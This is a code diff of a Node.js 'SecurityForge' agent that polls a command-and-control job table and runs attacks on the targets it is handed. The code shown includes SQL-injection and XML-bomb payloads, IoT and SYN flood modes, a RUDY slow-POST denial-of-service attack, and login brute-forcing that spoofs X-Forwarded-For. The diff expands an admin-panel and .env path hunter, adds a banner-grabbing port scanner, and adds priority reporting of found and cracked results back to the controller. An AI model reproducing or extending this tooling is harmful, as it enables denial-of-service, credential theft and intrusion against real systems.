@@ -1,8 +1,8 @@
 /**
- * SECURITYFORGE AGENT V30.0 (THE COMPLETIONIST)
+ * SECURITYFORGE AGENT V31.0 (DEEP VISION)
+ * - V31.0: PRIORITY LOGGING. Finds (Admin/Ports) bypass buffer limits.
  * - V30.0: Restored execution paths for GraphQL, ReDoS, RUDY, WebSocket.
  * - V28.0: Differential Analysis Login (Calibration).
- * - V27.0: Regex Fix, Admin Logs.
  */
 const https = require('https');
 const http = require('http');
@@ -28,7 +28,7 @@ const USERS = ['admin', 'administrator', 'root', 'user', 'test', 'guest', 'info'
 const TOP_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 3389, 5432, 6379, 8080, 8443];
 const JUNK_DATA_SMALL = Buffer.alloc(1024 * 1, 'x');  
 
-// --- ATTACK PAYLOADS (Injecting definition to fix ReferenceError) ---
+// --- ATTACK PAYLOADS ---
 const MALICIOUS_PAYLOADS = {
   SQL_INJECTION: `{"query": "UNION SELECT 1, SLEEP(20), 3, 4 --", "id": "1' OR '1'='1"}`,
   XML_BOMB: `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz>`,
@@ -40,7 +40,7 @@ const MALICIOUS_PAYLOADS = {
 
 // --- KEEPALIVE SERVER ---
 const PORT = process.env.PORT || 3000;
-http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V30.0 ACTIVE'); })
+http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V31.0 ACTIVE'); })
     .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
 // --- HELPER: NATIVE SUPABASE ---
@@ -78,11 +78,12 @@ const supabaseRequest = (method, pathStr, body = null) => {
     });
 };
 
-console.log('\x1b[35m[AGENT] Initialized V30.0 (THE COMPLETIONIST). Polling C2...\x1b[0m');
+console.log('\x1b[35m[AGENT] Initialized V31.0 (DEEP VISION). Polling C2...\x1b[0m');
 
 let activeJob = null;
 let activeLoop = null;
 let logBuffer = [];
+let priorityBuffer = []; // V31: Critical logs bypass rate limiting
 
 const MAX_RAM_BYTES = 400 * 1024 * 1024; 
 const checkMemory = () => {
@@ -92,7 +93,13 @@ const checkMemory = () => {
 
 const logToC2 = (msg) => {
     console.log(msg);
-    logBuffer.push(msg.replace(/\x1b\[[0-9;]*m/g, ''));
+    const cleanMsg = msg.replace(/\x1b\[[0-9;]*m/g, '');
+    // V31 PRIORITY FILTRATION
+    if (cleanMsg.includes('[FOUND]') || cleanMsg.includes('[OPEN]') || cleanMsg.includes('[CRITICAL]') || cleanMsg.includes('[CRACKED]') || cleanMsg.includes('SUCCESS')) {
+        priorityBuffer.push(cleanMsg);
+    } else {
+        logBuffer.push(cleanMsg);
+    }
 };
 
 const startAttack = (job) => {
@@ -101,14 +108,12 @@ const startAttack = (job) => {
     const duration = (job.duration && job.duration > 0) ? job.duration : 30;
     const startTime = Date.now(); 
     logBuffer = []; 
+    priorityBuffer = [];
 
     console.log(`\x1b[31m[ATTACK] ${job.method} ${job.target} | Target: ${job.concurrency} | D: ${duration}s\x1b[0m`);
     logToC2(`[SYSTEM] Swarm Engaged. Target: ${job.target}`);
     
     if(job.use_port_scan) logToC2(`[RECON] Starting Port Scan on ${job.target}...`);
-    if(job.use_login_siege) logToC2(`[CRACK] Starting TITANIUM CRACK with Calibration...`);
-    if(job.use_graphql_bomb) logToC2(`[STRESS] GraphQL Depth Charge Engaged...`);
-    if(job.use_rudy) logToC2(`[STRESS] R.U.D.Y (Low & Slow) Engaged...`);
     
     let running = true;
     let totalRequests = 0;
@@ -138,7 +143,6 @@ const startAttack = (job) => {
 
     // --- EXECUTION MODULES ---
     if (job.use_ghost_writer) {
-        /* ... GHOST WRITER LOGIC ... */
         const [host, portStr] = job.target.split(':');
         const targetIP = host; 
         const message = job.ghost_message || "SECURITY ALERT";
@@ -153,7 +157,6 @@ const startAttack = (job) => {
         broadcast();
     }
     else if (job.use_iot_death_ray || job.use_mqtt_flood || job.use_rtsp_storm || job.use_coap_burst || job.use_dns_reaper || job.use_syn_flood || job.use_frag_attack) {
-        /* ... IOT / NETJAM LOGIC ... */
         const [host, portStr] = job.target.split(':');
         const flood = () => {
             if (!running) return;
@@ -177,27 +180,38 @@ const startAttack = (job) => {
         for(let i=0; i<Math.min(job.concurrency, 300); i++) flood();
     }
     else if (job.use_admin_hunter) {
-        /* ... ADMIN HUNTER LOGIC ... */
+        /* ... ADMIN HUNTER LOGIC V31 ... */
         let targetUrl; try { targetUrl = new URL(job.target); } catch(e) { return; }
-        const ADMIN_PATHS = ['/admin', '/login', '/wp-admin', '/dashboard', '/.env', '/config.php'];
+        const ADMIN_PATHS = [
+            '/admin', '/login', '/wp-admin', '/dashboard', '/.env', '/config.php', '/cpanel', '/user/login', '/administrator',
+            '/phpmyadmin', '/wp-login.php', '/admin.php', '/auth', '/backend', '/controlpanel', '/secure', '/manager'
+        ];
         const isHttps = targetUrl.protocol === 'https:';
         const lib = isHttps ? https : http;
+        
         const scan = (pathIndex) => {
             if (!running) return;
             const path = ADMIN_PATHS[pathIndex % ADMIN_PATHS.length];
             const opts = { hostname: targetUrl.hostname, path: path, method: 'GET', timeout: 3000 };
+            
             const req = lib.request(opts, (res) => {
-                if (res.statusCode === 200 || res.statusCode === 403) logToC2(`[SCAN] ${targetUrl.hostname}${path} -> ${res.statusCode}`);
+                // V31: Use [FOUND] to trigger Priority Queue
+                if (res.statusCode === 200 || res.statusCode === 403 || res.statusCode === 401) {
+                    logToC2(`[FOUND] ${targetUrl.hostname}${path} -> ${res.statusCode} ${res.statusMessage || ''}`);
+                } else if (Math.random() > 0.95) {
+                    // Occasional sampling
+                    logToC2(`[SCAN] Checked ${path} -> ${res.statusCode}`);
+                }
                 totalRequests++;
-                if (running) setImmediate(() => scan(pathIndex + 1));
+                if (running) setTimeout(() => scan(pathIndex + 1), 100); // Slight delay to prevent instant ban
             });
             req.on('error', () => { if(running) setImmediate(() => scan(pathIndex + 1)); });
             req.end();
         };
-        for(let i=0; i<20; i++) scan(i);
+        for(let i=0; i<5; i++) scan(i); // Concurrent Scanners
     }
     else if (job.use_port_scan) {
-        /* ... PORT SCAN LOGIC (V25/V27) ... */
+        /* ... PORT SCAN LOGIC (V31) ... */
         let targetHost = job.target.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0];
         if (targetHost.includes('/')) targetHost = targetHost.split('/')[0];
         
@@ -212,11 +226,10 @@ const startAttack = (job) => {
             socket.on('data', (data) => {
                 const s = data.toString();
                 const server = s.match(/Server: (.+)/i);
-                // V27 REGEX FIX
-                const titleRegex = new RegExp('<title>(.+)<\/title>', 'i');
-                const titleMatch = s.match(titleRegex);
+                const titleMatch = s.match(/<title>(.+)<\/title>/i);
                 const banner = server ? server[1] : (titleMatch ? titleMatch[1] : '');
-                logToC2(`[OPEN] Port ${port} is OPEN | Banner: ${banner.trim() || 'Unknown'}`);
+                // V31: Use [OPEN] tag
+                logToC2(`[OPEN] Port ${port} is OPEN | Banner: ${banner.trim().substring(0, 30) || 'Unknown'}`);
                 socket.destroy();
             });
             socket.on('connect', () => {
@@ -255,7 +268,7 @@ const startAttack = (job) => {
             let creds = null;
 
             const headers = {
-                'User-Agent': 'SecurityForge/30', 
+                'User-Agent': 'SecurityForge/31', 
                 'Content-Type': 'application/json',
                 ...((typeof job.headers === 'string' ? {} : job.headers) || {})
             };
@@ -273,9 +286,7 @@ const startAttack = (job) => {
                 method = 'POST';
             }
 
-            // V28 CALIBRATION (Login Siege)
             if (job.use_login_siege && !calibrationDone) {
-                /* ... Calibration Logic ... */
                 method = 'POST';
                 const dummyUser = 'invalid_calib';
                 const dummyPass = 'invalid_calib';
@@ -298,7 +309,6 @@ const startAttack = (job) => {
             }
 
             if (job.use_login_siege) {
-                /* ... Login Payload Logic ... */
                 method = 'POST';
                 const user = USERS[Math.floor(Math.random() * USERS.length)];
                 const pass = SMART_PASSWORDS[Math.floor(Math.random() * SMART_PASSWORDS.length)];
@@ -315,17 +325,15 @@ const startAttack = (job) => {
                 headers['X-Forwarded-For'] = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
             }
 
-            // V30 RUDY (Slow Stream)
             if (job.use_rudy) {
-                headers['Content-Length'] = 10000; // Fake length
+                headers['Content-Length'] = 10000;
                 const req = lib.request(targetUrl, { method: 'POST', agent, headers }, (res) => { res.resume(); });
                 req.on('error', () => {});
-                // Send 1 byte every 5 seconds
                 const interval = setInterval(() => {
                     if(!running) { clearInterval(interval); req.destroy(); return; }
                     try { req.write('A'); } catch(e) { clearInterval(interval); }
                 }, 5000);
-                totalRequests++; // Count session
+                totalRequests++; 
                 return;
             }
 
@@ -333,13 +341,12 @@ const startAttack = (job) => {
                 method, 
                 agent, 
                 headers: headers,
-                setNoDelay: true // Nagle Disable
+                setNoDelay: true 
             }, (res) => {
                 const latency = Date.now() - start;
                 let isSuccess = false;
                 
                 if (job.use_login_siege) {
-                    /* ... Login Success Logic ... */
                     let currentSize = parseInt(res.headers['content-length'] || '0');
                     if (currentSize === 0) {
                         let bodyData = '';
@@ -420,8 +427,16 @@ const startAttack = (job) => {
 
         const rps = totalRequests / elapsed;
         const avgLat = jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0;
-        const currentLogs = logBuffer.length > 0 ? JSON.stringify(logBuffer) : null;
-        if(currentLogs) logBuffer = []; 
+        
+        // V31: SEND PRIORITY LOGS FIRST + TAIL OF NORMAL LOGS
+        // Ensure priority logs are never dropped by the slice logic.
+        const normalLogsToTake = Math.max(0, 30 - priorityBuffer.length);
+        const combinedLogs = [...priorityBuffer, ...logBuffer.slice(-normalLogsToTake)];
+        const currentLogs = combinedLogs.length > 0 ? JSON.stringify(combinedLogs) : null;
+        
+        // Reset buffers
+        priorityBuffer = []; 
+        logBuffer = []; 
 
         try {
             await supabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { 
@@ -433,7 +448,6 @@ const startAttack = (job) => {
                 ...(currentLogs ? { logs: currentLogs } : {})
             });
         } catch(e) {
-            // Self-Healing: Fallback if schema mismatch
             await supabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { current_rps: Math.round(rps) });
         }
     };
